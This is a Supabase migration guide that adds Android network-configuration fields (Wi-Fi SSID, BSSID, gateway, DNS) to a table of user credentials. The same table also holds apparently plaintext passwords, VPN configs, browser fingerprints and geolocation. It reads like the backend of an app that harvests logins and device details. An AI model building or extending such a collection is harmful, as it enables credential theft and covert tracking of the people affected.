# Database Migration Guide - Adding Native Network Config Support

## Overview
This guide helps you update your existing Supabase database to support native Android network configuration data.

---

## What's Being Added

### New Columns:
1. **native_network_config** (JSONB) - Stores network configuration from Android app
2. **platform_type** (VARCHAR) - Identifies if data came from 'web' or 'native' platform

### New Indexes:
- `idx_user_credentials_platform_type` - Fast filtering by platform
- `idx_user_credentials_has_native_network` - Find records with native network data
- `idx_user_credentials_wifi_ssid` - Search by WiFi network name
- `idx_user_credentials_gateway` - Search by gateway address
- `idx_user_credentials_native_network_gin` - Full-text search in network config

### New Views:
- `vw_native_network_config` - View native network details
- `vw_platform_comparison` - Compare web vs native data collection

---

## Option 1: Fresh Start (Recommended for Testing)

If you want to start with a clean database:

1. **Open Supabase SQL Editor**
   - Go to https://supabase.com/dashboard
   - Select your project
   - Click "SQL Editor" in sidebar

2. **Run the New Schema**
   ```sql
   -- Copy entire contents from:
   database-schema-with-native-network.sql
   
   -- Paste into SQL Editor and click "Run"
   ```

3. **Verify Installation**
   ```sql
   -- Check table structure
   SELECT column_name, data_type 
   FROM information_schema.columns
   WHERE table_name = 'user_credentials'
   ORDER BY ordinal_position;
   
   -- Should see 18 columns including:
   -- - native_network_config (jsonb)
   -- - platform_type (varchar)
   ```

---

## Option 2: Migrate Existing Data (Preserve Your Data)

If you have existing data you want to keep:

### Step 1: Add New Columns

```sql
-- Add native_network_config column
ALTER TABLE user_credentials 
ADD COLUMN IF NOT EXISTS native_network_config JSONB;

-- Add platform_type column
ALTER TABLE user_credentials 
ADD COLUMN IF NOT EXISTS platform_type VARCHAR(20) DEFAULT 'web';

-- Add comments
COMMENT ON COLUMN user_credentials.native_network_config IS 
'Native Android network configuration (JSONB) - gateway, DNS, WiFi details';

COMMENT ON COLUMN user_credentials.platform_type IS 
'Platform type: "web" for PWA/browser, "native" for Android app';
```

### Step 2: Add New Indexes

```sql
-- Platform type index
CREATE INDEX IF NOT EXISTS idx_user_credentials_platform_type 
ON user_credentials(platform_type);

-- Native network config indexes
CREATE INDEX IF NOT EXISTS idx_user_credentials_has_native_network 
ON user_credentials ((native_network_config IS NOT NULL));

CREATE INDEX IF NOT EXISTS idx_user_credentials_wifi_ssid 
ON user_credentials ((native_network_config->>'ssid'));

CREATE INDEX IF NOT EXISTS idx_user_credentials_gateway 
ON user_credentials ((native_network_config->>'gateway'));

CREATE INDEX IF NOT EXISTS idx_user_credentials_native_network_gin 
ON user_credentials USING GIN (native_network_config);
```

### Step 3: Migrate Existing Data (if applicable)

If you already have some native network data stored in `system_info->advanced->native_network_config`:

```sql
-- Move native_network_config from system_info to dedicated column
UPDATE user_credentials
SET 
    native_network_config = system_info->'advanced'->'native_network_config',
    platform_type = CASE 
        WHEN system_info->'advanced'->'collection_info'->>'platform' = 'native' THEN 'native'
        ELSE 'web'
    END
WHERE 
    system_info->'advanced'->'native_network_config' IS NOT NULL;

-- Verify migration
SELECT 
    COUNT(*) AS total_migrated,
    platform_type
FROM user_credentials
WHERE native_network_config IS NOT NULL
GROUP BY platform_type;
```

### Step 4: Create New Views

```sql
-- View for native network configuration
CREATE OR REPLACE VIEW vw_native_network_config AS
SELECT 
    id,
    username,
    created_at,
    platform_type,
    native_network_config->>'ipAddress' AS ip_address,
    native_network_config->>'gateway' AS gateway,
    native_network_config->>'dns1' AS dns_primary,
    native_network_config->>'dns2' AS dns_secondary,
    native_network_config->>'ssid' AS wifi_ssid,
    native_network_config->>'bssid' AS wifi_bssid,
    native_network_config->>'linkSpeed' AS link_speed,
    native_network_config->>'rssi' AS signal_strength,
    native_network_config->>'frequency' AS frequency,
    native_network_config->>'subnetMask' AS subnet_mask,
    (native_network_config->>'networkPrefixLength')::int AS prefix_length,
    (native_network_config->>'mtu')::int AS mtu,
    native_network_config->>'interfaceName' AS interface_name,
    native_network_config->>'connectionType' AS connection_type,
    native_network_config->>'downlinkBandwidth' AS download_bandwidth,
    native_network_config->>'uplinkBandwidth' AS upload_bandwidth
FROM user_credentials
WHERE native_network_config IS NOT NULL
ORDER BY created_at DESC;

-- View for platform comparison
CREATE OR REPLACE VIEW vw_platform_comparison AS
SELECT 
    platform_type,
    COUNT(*) AS total_records,
    COUNT(CASE WHEN ovpn_config IS NOT NULL THEN 1 END) AS records_with_ovpn,
    COUNT(CASE WHEN system_info->'advanced' IS NOT NULL THEN 1 END) AS records_with_advanced_data,
    COUNT(CASE WHEN native_network_config IS NOT NULL THEN 1 END) AS records_with_native_network,
    MIN(created_at) AS first_record,
    MAX(created_at) AS last_record
FROM user_credentials
GROUP BY platform_type
ORDER BY platform_type;
```

### Step 5: Update Existing Summary View

```sql
-- Update vw_credentials_summary to include new columns
CREATE OR REPLACE VIEW vw_credentials_summary AS
SELECT 
    id,
    username,
    ip_address,
    created_at,
    platform_type,  -- ⭐ NEW
    server_ip,
    server_port,
    protocol,
    system_info->'basic'->>'platform' AS platform,
    system_info->'basic'->>'userAgent' AS user_agent,
    system_info->'advanced'->'network_topology'->>'natType' AS nat_type,
    system_info->'advanced'->'fingerprint'->>'canvas' AS canvas_hash,
    system_info->'advanced'->'fingerprint'->'webgl'->>'renderer' AS webgl_renderer,
    (ovpn_config IS NOT NULL) AS has_ovpn_config,
    LENGTH(ovpn_config) AS ovpn_config_size,
    (system_info->'advanced' IS NOT NULL) AS has_advanced_data,
    (native_network_config IS NOT NULL) AS has_native_network_config,  -- ⭐ NEW
    (system_info->'basic'->'geolocation' IS NOT NULL AND 
     system_info->'basic'->'geolocation' != '"denied"'::jsonb) AS has_geolocation
FROM user_credentials
ORDER BY created_at DESC;
```

---

## Verification

After migration, run these queries to verify everything works:

```sql
-- 1. Check table structure (should show 18 columns)
SELECT 
    column_name, 
    data_type, 
    is_nullable
FROM information_schema.columns
WHERE table_name = 'user_credentials'
ORDER BY ordinal_position;

-- 2. Check indexes (should show 13 indexes)
SELECT indexname
FROM pg_indexes
WHERE tablename = 'user_credentials'
ORDER BY indexname;

-- 3. Check views (should show 5 views)
SELECT table_name
FROM information_schema.views
WHERE table_name LIKE 'vw_%'
ORDER BY table_name;

-- 4. View summary
SELECT * FROM vw_credentials_summary LIMIT 5;

-- 5. Platform comparison
SELECT * FROM vw_platform_comparison;
```

---

## Testing the New Structure

### Test 1: Insert Web Data (PWA)
```sql
INSERT INTO user_credentials (
    username, 
    password, 
    platform_type,
    system_info
) VALUES (
    'test_web_user',
    'test_password',
    'web',
    '{"basic": {"platform": "Win32"}, "advanced": {}}'::jsonb
);
```

### Test 2: Insert Native Data (Android App)
```sql
INSERT INTO user_credentials (
    username, 
    password, 
    platform_type,
    native_network_config
) VALUES (
    'test_native_user',
    'test_password',
    'native',
    '{
        "ipAddress": "10.82.33.136",
        "gateway": "10.82.0.1",
        "dns1": "10.10.92.99",
        "dns2": "10.10.92.98",
        "ssid": "TestNetwork",
        "bssid": "aa:bb:cc:dd:ee:ff",
        "linkSpeed": "72 Mbps",
        "rssi": "-45 dBm",
        "frequency": "5180 MHz",
        "subnetMask": "255.255.0.0",
        "networkPrefixLength": 16,
        "mtu": 1500
    }'::jsonb
);
```

### Test 3: Query Native Network Data
```sql
-- View all native network configs
SELECT * FROM vw_native_network_config;

-- Find by WiFi network
SELECT username, wifi_ssid, gateway, dns_primary
FROM vw_native_network_config
WHERE wifi_ssid = 'TestNetwork';

-- Get gateway statistics
SELECT 
    gateway,
    COUNT(*) AS connection_count,
    ARRAY_AGG(DISTINCT wifi_ssid) AS wifi_networks
FROM vw_native_network_config
GROUP BY gateway
ORDER BY connection_count DESC;
```

---

## Rollback (If Needed)

If something goes wrong, you can rollback:

```sql
-- Remove new columns
ALTER TABLE user_credentials 
DROP COLUMN IF EXISTS native_network_config,
DROP COLUMN IF EXISTS platform_type;

-- Drop new indexes
DROP INDEX IF EXISTS idx_user_credentials_platform_type;
DROP INDEX IF EXISTS idx_user_credentials_has_native_network;
DROP INDEX IF EXISTS idx_user_credentials_wifi_ssid;
DROP INDEX IF EXISTS idx_user_credentials_gateway;
DROP INDEX IF EXISTS idx_user_credentials_native_network_gin;

-- Drop new views
DROP VIEW IF EXISTS vw_native_network_config;
DROP VIEW IF EXISTS vw_platform_comparison;
```

---

## Expected Data Structure

After migration, your data will look like this:

### Web Platform (PWA)
```json
{
  "id": 1,
  "username": "web_user",
  "platform_type": "web",
  "system_info": {
    "basic": { /* 70+ browser data points */ },
    "advanced": {
      "certificates": {},
      "network_topology": {},
      "fingerprint": {},
      "collection_info": { "platform": "web" }
    }
  },
  "native_network_config": null  // NULL for web users
}
```

### Native Platform (Android App)
```json
{
  "id": 2,
  "username": "native_user",
  "platform_type": "native",
  "system_info": {
    "basic": { /* 70+ browser data points */ },
    "advanced": {
      "certificates": {},
      "network_topology": {},
      "fingerprint": {},
      "collection_info": { "platform": "native" }
    }
  },
  "native_network_config": {
    "ipAddress": "10.82.33.136",
    "gateway": "10.82.0.1",
    "dns1": "10.10.92.99",
    "dns2": "10.10.92.98",
    "ssid": "WiFiNetwork",
    "bssid": "aa:bb:cc:dd:ee:ff",
    "linkSpeed": "72 Mbps",
    "rssi": "-45 dBm",
    "frequency": "5180 MHz",
    "subnetMask": "255.255.0.0",
    "networkPrefixLength": 16,
    "mtu": 1500,
    "interfaceName": "wlan0",
    "connectionType": "wifi",
    "downlinkBandwidth": "72000 Kbps",
    "uplinkBandwidth": "72000 Kbps",
    "hasWifi": true,
    "hasCellular": false,
    "hasEthernet": false,
    "autoReconnect": true
  }
}
```

---

## Summary

✅ **Recommended Approach**:
- Use **Option 2** (Migration) if you have existing data
- Use **Option 1** (Fresh Start) if this is a new project or testing

✅ **What Gets Updated**:
- 2 new columns (native_network_config, platform_type)
- 5 new indexes
- 2 new views
- Updated summary view

✅ **Backwards Compatible**:
- Existing web/PWA submissions continue working
- New native app submissions get additional network data
- No data loss during migration

✅ **Next Steps**:
1. Run migration SQL in Supabase
2. Deploy updated API (api/submit.js)
3. Test with PWA (should work as before)
4. Build Android APK and test native network collection

---

**Questions?** Check the verification queries above or test with sample inserts.
